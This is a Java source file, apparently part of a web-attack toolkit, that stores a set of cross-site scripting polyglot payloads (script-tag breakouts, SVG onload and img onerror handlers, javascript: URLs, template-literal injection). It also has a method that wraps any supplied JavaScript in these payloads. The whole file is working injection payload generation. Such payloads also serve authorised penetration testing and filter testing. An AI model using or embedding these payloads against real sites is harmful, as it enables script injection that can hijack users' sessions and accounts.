import java.nio.charset.StandardCharsets;
import java.util.LinkedHashMap;
import java.util.Map;

/**
 * Polyglot payload generator for multi-context injection (HTML, JS, URL, SQL).
 */
public final class PayloadTranscoderPolyglot {

    private PayloadTranscoderPolyglot() {}

    public static Map<String, byte[]> getPolyglots() {
        Map<String, byte[]> m = new LinkedHashMap<>();
        m.put("HTML+JS+URL (alert)", ("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e").getBytes(StandardCharsets.UTF_8));
        m.put("HTML+JS+URL (1)", ("javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>").getBytes(StandardCharsets.UTF_8));
        m.put("SQL+HTML", ("'\"-->]]>*/</script><script>alert(1)</script>--").getBytes(StandardCharsets.UTF_8));
        m.put("HTML+JS+Math", ("<img src=x onerror=\"/**/alert(1)\">").getBytes(StandardCharsets.UTF_8));
        m.put("Comment polyglot", ("--><!-- --><script>alert(1)</script>--").getBytes(StandardCharsets.UTF_8));
        m.put("Template literal", ("${alert(1)}").getBytes(StandardCharsets.UTF_8));
        m.put("Backtick", ("`-alert(1)-`").getBytes(StandardCharsets.UTF_8));
        return m;
    }

    /** Generate polyglot with custom payload. Input bytes = payload (e.g. alert(1)). */
    public static byte[] generatePolyglot(byte[] payload, String type) {
        String p = payload != null && payload.length > 0
                ? new String(payload, StandardCharsets.UTF_8).trim()
                : "alert(1)";
        if (p.isEmpty()) p = "alert(1)";
        String escaped = p.replace("\\", "\\\\").replace("'", "\\'").replace("\"", "\\\"");
        return switch (type) {
            case "HTML+JS+URL" -> ("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=" + escaped + " )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=" + escaped + "//>\\x3e").getBytes(StandardCharsets.UTF_8);
            case "SQL+HTML" -> ("'\"-->]]>*/</script><script>" + p + "</script>--").getBytes(StandardCharsets.UTF_8);
            case "Template literal" -> ("${" + p + "}").getBytes(StandardCharsets.UTF_8);
            default -> ("jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=" + escaped + " )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=" + escaped + "//>\\x3e").getBytes(StandardCharsets.UTF_8);
        };
    }
}
